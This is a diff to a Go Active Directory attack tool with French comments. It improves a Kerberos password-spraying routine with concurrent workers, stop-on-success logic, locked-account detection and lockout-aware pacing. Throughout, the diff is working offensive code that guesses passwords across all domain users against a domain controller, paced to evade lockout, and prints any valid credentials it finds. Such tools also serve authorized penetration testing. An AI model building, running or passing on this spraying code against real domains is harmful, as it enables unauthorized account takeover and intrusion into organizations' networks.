@@ -9,6 +9,7 @@ import (
 	"os"
 	"strings"
 	"sync"
+	"sync/atomic"
 	"time"
 
 	"adgo/pkg/ldap"
@@ -25,7 +26,7 @@ type SprayConfig struct {
 	DCIP          string
 	Delay         int // Délai entre tentatives (secondes)
 	Jitter        int // Variation aléatoire du délai (%)
-	Threads       int // Nombre de threads parallèles
+	Threads       int // Nombre de threads parallèles (défaut: 1)
 	Verbose       bool
 	LockoutCheck  bool // Vérifier la politique de lockout avant de commencer
 	StopOnSuccess bool // Arrêter dès la première réussite
@@ -51,7 +52,10 @@ type SpraySummary struct {
 	EndTime         time.Time
 }
 
-// PasswordSpray exécute un password spray avec protection anti-lockout
+// PasswordSpray exécute un password spray avec protection anti-lockout.
+//
+// Stratégie : on spray UN mot de passe sur TOUS les users, on attend,
+// puis le mot de passe suivant. Cela évite les lockouts sur un compte unique.
 func PasswordSpray(cfg *SprayConfig) (*SpraySummary, error) {
 	summary := &SpraySummary{
 		StartTime: time.Now(),
@@ -79,69 +83,129 @@ func PasswordSpray(cfg *SprayConfig) (*SpraySummary, error) {
 		}
 	}
 
-	// 4. Calculer le délai sécurisé
-	safeDelay := calculateSafeDelay(cfg.Delay, len(users))
-	fmt.Printf("[*] Using delay: %d seconds (±%d%% jitter)\n", safeDelay, cfg.Jitter)
-	fmt.Printf("[*] Estimated duration: %v\n", estimateDuration(len(users), len(passwords), safeDelay))
+	// 4. Délai de base (on utilise cfg.Delay directement — pas de recalcul)
+	baseDelay := cfg.Delay
+	if baseDelay < 1 {
+		baseDelay = 1
+	}
+	fmt.Printf("[*] Using delay: %d seconds (±%d%% jitter)\n", baseDelay, cfg.Jitter)
+	fmt.Printf("[*] Estimated duration: %v\n", estimateDuration(len(users), len(passwords), baseDelay))
 
-	// 5. Exécuter le spray
-	results := make(chan SprayResult, len(users)*len(passwords))
-	var wg sync.WaitGroup
+	// 5. Limiter le nombre de threads simultanés (semaphore)
+	threads := cfg.Threads
+	if threads < 1 {
+		threads = 1
+	}
+	sem := make(chan struct{}, threads)
 
-	// Spray par mot de passe (PAS par utilisateur!)
-	// Pourquoi ? Pour éviter les lockouts : on teste password1 sur TOUS les users,
-	// puis on attend, puis password2 sur TOUS les users, etc.
+	// Compteurs atomiques pour éviter les race conditions
+	var totalAttempts int64
+	var failedAttempts int64
+
+	// Mutex pour les slices partagées
+	var mu sync.Mutex
+
+	// Canal d'arrêt pour --stop-on-success
+	stop := make(chan struct{})
+	stopped := false
+
+	// 6. Spray par mot de passe (PAS par utilisateur!)
 	for _, password := range passwords {
+		// Vérifier si on doit s'arrêter
+		select {
+		case <-stop:
+			goto done
+		default:
+		}
+
 		fmt.Printf("\n[*] Spraying password: %s\n", maskPassword(password))
 
-		for _, username := range users {
-			wg.Add(1)
+		var wg sync.WaitGroup
 
-			// Limiter la concurrence
-			if cfg.Threads > 1 {
-				// TODO: Implémenter un worker pool
+		for _, username := range users {
+			// Vérifier stop avant chaque goroutine
+			select {
+			case <-stop:
+				goto waitAndContinue
+			default:
 			}
+
+			wg.Add(1)
+			sem <- struct{}{} // Acquérir le semaphore (bloque si threads saturés)
 
 			go func(user, pass string) {
 				defer wg.Done()
+				defer func() { <-sem }() // Libérer le semaphore
 
 				result := tryCredential(user, pass, cfg.Domain, cfg.DCIP)
-				results <- result
 
-				if cfg.Verbose || result.Success {
-					printResult(result)
-				}
-
-				summary.TotalAttempts++
+				// Mise à jour thread-safe des compteurs
+				atomic.AddInt64(&totalAttempts, 1)
 				if result.Success {
+					mu.Lock()
 					summary.SuccessfulCreds = append(summary.SuccessfulCreds, result)
+					alreadyStopped := stopped
+					mu.Unlock()
 
-					if cfg.StopOnSuccess {
-						fmt.Println("[+] Success! Stopping spray...")
-						return
+					if cfg.Verbose || result.Success {
+						printResult(result)
+					}
+
+					if cfg.StopOnSuccess && !alreadyStopped {
+						mu.Lock()
+						if !stopped {
+							stopped = true
+							close(stop)
+							fmt.Println("[+] Success! Stopping spray...")
+						}
+						mu.Unlock()
 					}
 				} else {
-					summary.FailedAttempts++
+					atomic.AddInt64(&failedAttempts, 1)
+
+					if cfg.Verbose {
+						printResult(result)
+					}
+
+					// Détecter les comptes verrouillés
+					if result.Error == "account locked or disabled" {
+						mu.Lock()
+						summary.LockedAccounts = append(summary.LockedAccounts, result.Username)
+						mu.Unlock()
+						printResult(result)
+					}
 				}
 
-				// Délai avec jitter
-				delay := applyJitter(safeDelay, cfg.Jitter)
-				time.Sleep(time.Duration(delay) * time.Second)
+				// Délai inter-tentative avec jitter (dans la goroutine)
+				if baseDelay > 0 {
+					delay := applyJitter(baseDelay, cfg.Jitter)
+					time.Sleep(time.Duration(delay) * time.Second)
+				}
 			}(username, password)
 		}
 
+	waitAndContinue:
 		wg.Wait()
 
-		// Pause entre chaque mot de passe
+		// Vérifier stop après le round
+		select {
+		case <-stop:
+			goto done
+		default:
+		}
+
+		// Pause entre chaque mot de passe (délai × 2)
 		if len(passwords) > 1 {
-			pauseDuration := time.Duration(safeDelay*2) * time.Second
+			pauseDuration := time.Duration(baseDelay*2) * time.Second
 			fmt.Printf("[*] Pausing %v before next password...\n", pauseDuration)
 			time.Sleep(pauseDuration)
 		}
 	}
 
-	close(results)
-
+done:
+	// Transférer les compteurs atomiques dans le résumé
+	summary.TotalAttempts = int(atomic.LoadInt64(&totalAttempts))
+	summary.FailedAttempts = int(atomic.LoadInt64(&failedAttempts))
 	summary.EndTime = time.Now()
 	summary.Duration = summary.EndTime.Sub(summary.StartTime)
 
@@ -158,15 +222,23 @@ func tryCredential(username, password, domain, dcIP string) SprayResult {
 
 	realm := strings.ToUpper(domain)
 
-	// Configuration Kerberos minimale
 	krb5Conf := fmt.Sprintf(`[libdefaults]
     default_realm = %s
     dns_lookup_kdc = false
+    forwardable = true
 
 [realms]
     %s = {
         kdc = %s:88
-    }`, realm, realm, dcIP)
+        admin_server = %s
+    }
+
+[domain_realm]
+    .%s = %s
+    %s = %s
+`, realm, realm, dcIP, dcIP,
+		strings.ToLower(domain), realm,
+		strings.ToLower(domain), realm)
 
 	cfg, err := config.NewFromString(krb5Conf)
 	if err != nil {
@@ -174,7 +246,6 @@ func tryCredential(username, password, domain, dcIP string) SprayResult {
 		return result
 	}
 
-	// Tenter l'authentification
 	cl := client.NewWithPassword(username, realm, password, cfg,
 		client.DisablePAFXFAST(true))
 
@@ -184,7 +255,6 @@ func tryCredential(username, password, domain, dcIP string) SprayResult {
 		return result
 	}
 
-	// Analyser l'erreur
 	errStr := err.Error()
 	switch {
 	case strings.Contains(errStr, "KDC_ERR_PREAUTH_FAILED"):
@@ -195,6 +265,8 @@ func tryCredential(username, password, domain, dcIP string) SprayResult {
 		result.Error = "account locked or disabled"
 	case strings.Contains(errStr, "KDC_ERR_KEY_EXPIRED"):
 		result.Error = "password expired"
+	case strings.Contains(errStr, "KDC_ERR_WRONG_REALM"):
+		result.Error = "wrong domain/realm"
 	default:
 		result.Error = fmt.Sprintf("KDC error: %v", err)
 	}
@@ -202,57 +274,41 @@ func tryCredential(username, password, domain, dcIP string) SprayResult {
 	return result
 }
 
-// checkLockoutPolicy vérifie la politique de lockout du domaine
+// checkLockoutPolicy vérifie la politique de lockout du domaine via LDAP anonyme
 func checkLockoutPolicy(domain, dcIP string) error {
 	fmt.Println("[*] Checking domain lockout policy...")
 
 	ldapURL := fmt.Sprintf("ldap://%s:389", dcIP)
 	baseDN := domainToBaseDN(domain)
 
-	// Connexion anonyme ou avec credentials ?
-	// Pour simplifier, on tente une connexion anonyme
 	ctx := context.Background()
-	client, err := ldap.NewClient(ctx, ldapURL, "", "", false)
+	ldapClient, err := ldap.NewClient(ctx, ldapURL, "", "", false)
 	if err != nil {
 		return fmt.Errorf("LDAP connection failed: %v", err)
 	}
-	defer client.Close()
+	defer ldapClient.Close()
 
-	policy, err := client.GetPasswordPolicy(baseDN)
+	policy, err := ldapClient.GetPasswordPolicy(baseDN)
 	if err != nil {
 		return fmt.Errorf("failed to get password policy: %v", err)
 	}
 
 	fmt.Printf("[*] Domain Password Policy:\n")
-	fmt.Printf("    Lockout Threshold: %d attempts\n", policy.LockoutThreshold)
-	fmt.Printf("    Lockout Duration: %d minutes\n", policy.LockoutDurationMinutes)
-	fmt.Printf("    Min Password Length: %d\n", policy.MinPasswordLength)
+	fmt.Printf("    Lockout Threshold : %d attempts\n", policy.LockoutThreshold)
+	fmt.Printf("    Lockout Duration  : %d minutes\n", policy.LockoutDurationMinutes)
+	fmt.Printf("    Min Password Len  : %d\n", policy.MinPasswordLength)
 
 	if policy.LockoutThreshold > 0 && policy.LockoutThreshold < 5 {
 		fmt.Printf("[!] WARNING: Low lockout threshold (%d)! Be very careful.\n", policy.LockoutThreshold)
-		fmt.Println("[!] Recommended: Use only 1-2 passwords per spray round")
+		fmt.Println("[!] Recommended: use only 1-2 passwords per spray round")
 	}
 
 	return nil
 }
 
-// calculateSafeDelay calcule un délai sécurisé basé sur le nombre d'utilisateurs
-func calculateSafeDelay(baseDelay, userCount int) int {
-	// Règle générale : plus il y a d'utilisateurs, moins on a besoin de délai
-	// Car on ne reteste jamais le même user immédiatement
-
-	if userCount > 100 {
-		return baseDelay / 2
-	}
-	if userCount > 50 {
-		return baseDelay
-	}
-	return baseDelay * 2
-}
-
-// applyJitter ajoute une variation aléatoire au délai
+// applyJitter ajoute une variation aléatoire au délai (en secondes)
 func applyJitter(delay, jitterPercent int) int {
-	if jitterPercent == 0 {
+	if jitterPercent == 0 || delay == 0 {
 		return delay
 	}
 
@@ -270,25 +326,19 @@ func applyJitter(delay, jitterPercent int) int {
 func estimateDuration(users, passwords, delay int) time.Duration {
 	totalAttempts := users * passwords
 	totalSeconds := totalAttempts * delay
-
-	// Ajouter les pauses entre passwords
 	pauseSeconds := (passwords - 1) * delay * 2
-
 	return time.Duration(totalSeconds+pauseSeconds) * time.Second
 }
 
 // printResult affiche un résultat de façon formatée
 func printResult(r SprayResult) {
 	timestamp := r.Timestamp.Format("15:04:05")
-
 	if r.Success {
 		fmt.Printf("[%s] [+] SUCCESS: %s:%s\n", timestamp, r.Username, r.Password)
+	} else if r.Error == "account locked or disabled" {
+		fmt.Printf("[%s] [!] LOCKED: %s\n", timestamp, r.Username)
 	} else {
-		if r.Error == "account locked or disabled" {
-			fmt.Printf("[%s] [!] LOCKED: %s\n", timestamp, r.Username)
-		} else {
-			fmt.Printf("[%s] [-] %s:%s - %s\n", timestamp, r.Username, maskPassword(r.Password), r.Error)
-		}
+		fmt.Printf("[%s] [-] %s:%s - %s\n", timestamp, r.Username, maskPassword(r.Password), r.Error)
 	}
 }
 
@@ -297,10 +347,11 @@ func PrintSummary(summary *SpraySummary) {
 	fmt.Println("\n" + strings.Repeat("=", 60))
 	fmt.Println("PASSWORD SPRAY SUMMARY")
 	fmt.Println(strings.Repeat("=", 60))
-	fmt.Printf("Duration: %v\n", summary.Duration)
-	fmt.Printf("Total Attempts: %d\n", summary.TotalAttempts)
-	fmt.Printf("Successful: %d\n", len(summary.SuccessfulCreds))
-	fmt.Printf("Failed: %d\n", summary.FailedAttempts)
+	fmt.Printf("Duration       : %v\n", summary.Duration.Round(time.Second))
+	fmt.Printf("Total Attempts : %d\n", summary.TotalAttempts)
+	fmt.Printf("Successful     : %d\n", len(summary.SuccessfulCreds))
+	fmt.Printf("Failed         : %d\n", summary.FailedAttempts)
+	fmt.Printf("Locked         : %d\n", len(summary.LockedAccounts))
 
 	if len(summary.SuccessfulCreds) > 0 {
 		fmt.Println("\n[+] VALID CREDENTIALS:")
@@ -319,7 +370,9 @@ func PrintSummary(summary *SpraySummary) {
 	fmt.Println(strings.Repeat("=", 60))
 }
 
+// ============================================================
 // Helpers
+// ============================================================
 
 func loadLines(filename string) ([]string, error) {
 	file, err := os.Open(filename)
@@ -336,7 +389,6 @@ func loadLines(filename string) ([]string, error) {
 			lines = append(lines, line)
 		}
 	}
-
 	return lines, scanner.Err()
 }
 
